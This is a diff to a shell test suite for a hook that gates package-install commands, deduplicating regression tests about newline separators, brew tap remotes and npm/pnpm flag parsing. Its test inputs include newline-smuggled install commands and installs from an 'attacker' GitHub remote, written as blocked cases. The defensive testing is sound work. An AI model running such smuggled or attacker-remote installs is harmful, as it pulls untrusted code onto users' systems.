@@ -221,47 +221,6 @@ run_test "official tapped formula" "brew install homebrew/core/ripgrep" "allow"
 run_test "third-party tap still blocked" "brew tap evil/repo" "block"
 run_test "third-party tapped formula still blocked" "brew install evil/repo/tool" "block"
 
-echo "=== Regression (review 3): a newline is a command separator ==="
-# shlex counts \n as ordinary whitespace, so a multiline command collapsed into
-# ONE segment and the first line's --help exempted every line after it. Each
-# case below was confirmed to ALLOW against the pre-repair hook.
-run_test "newline separates, --help does not carry over" \
-    $'echo --help\npip install https://example.com/pkg.whl' "block"
-run_test "CRLF separates too" \
-    $'echo --help\r\npip install https://example.com/pkg.whl' "block"
-run_test "newline inside quotes is NOT a separator" $'echo \'a\nb\'' "allow"
-run_test "unbalanced-quote fallback still splits per line" \
-    $'echo --help "\npip install https://example.com/pkg.whl' "block"
-
-echo "=== Regression (review 3): brew tap remote overrides the tap name ==="
-# `brew tap <name> <remote>` fetches from <remote>, so an official-looking name
-# guarantees nothing. Only the name was checked before.
-run_test "official name, attacker remote" \
-    "brew tap homebrew/core https://github.com/attacker/repo" "block"
-run_test "third-party name, attacker remote" \
-    "brew tap homebrew/evil https://github.com/attacker/repo" "block"
-run_test "official tap with no remote still allowed" "brew tap homebrew/cask" "allow"
-
-echo "=== Regression (review 3): -w means different things per node tool ==="
-# npm's -w/--workspace takes a VALUE; pnpm's -w/--workspace-root is a BOOLEAN.
-# One shared table had to either falsely deny npm or skip pnpm's next token.
-run_test "npm --workspace takes a value" \
-    "npm install --workspace packages/web lodash" "allow"
-run_test "npm -w takes a value" "npm install -w packages/web lodash" "allow"
-run_test "pnpm -w is boolean, next token still scanned" \
-    "pnpm add -w git+https://github.com/foo/bar" "block"
-run_test "pnpm -w with a safe package" "pnpm add -w lodash" "allow"
-
-echo "=== Regression (review 3): scheme-less git specs survive per-tool tables ==="
-# installer_of now returns the concrete tool, so is_remote_pkg keys on a family
-# map. Getting that indirection wrong would switch every check below off.
-run_test "npm scheme-less" "npm install attacker/repo" "block"
-run_test "pnpm scheme-less" "pnpm add attacker/repo" "block"
-run_test "bun scheme-less" "bun add attacker/repo" "block"
-run_test "yarn scheme-less" "yarn add attacker/repo" "block"
-run_test "local relative path is not a git spec" "npm install ./local/path" "allow"
-run_test "plain registry package" "npm install lodash" "allow"
-
 echo "=== Regression: a NEWLINE is a command separator ==="
 # Review 3, P1. shlex counts \n as ordinary whitespace, so a multiline command
 # lexed into ONE segment and a `--help` on line 1 donated its exemption to an
@@ -366,6 +325,10 @@ run_test "pnpm -w is boolean, payload still caught" \
     "pnpm add -w github:foo/bar" "block"
 run_test "yarn -W is boolean, payload still caught" \
     "yarn add -W github:foo/bar" "block"
+# ...and the allow direction of the same split. Listing pnpm's -w as value-taking
+# would eat "lodash" and leave nothing to check, which passes for the wrong
+# reason; this fails loudly instead if the pnpm table ever inherits npm's.
+run_test "pnpm -w is boolean, safe package still allowed" "pnpm add -w lodash" "allow"
 # Splitting the tables by tool means is_remote_pkg must key on the FAMILY. If it
 # still compared against the literal "node", every scheme-less npm git spelling
 # would silently switch off — these four are the tripwire for that.
@@ -373,6 +336,9 @@ run_test "npm scheme-less shorthand still caught" "npm install foo/bar" "block"
 run_test "pnpm scheme-less shorthand still caught" "pnpm add foo/bar" "block"
 run_test "bun scheme-less shorthand still caught" "bun add foo/bar" "block"
 run_test "yarn scheme-less shorthand still caught" "yarn add foo/bar" "block"
+# The other side of that heuristic: a relative path also contains a slash. If the
+# scheme-less check ever loosens to "any token with a /", local installs break.
+run_test "local relative path is not a git spec" "npm install ./local/path" "allow"
 
 echo "=== Regression: gate cost must not be quadratic in token count ==="
 # Review 3, P2. candidate_starts() built `tokens[i:]` per token and retained
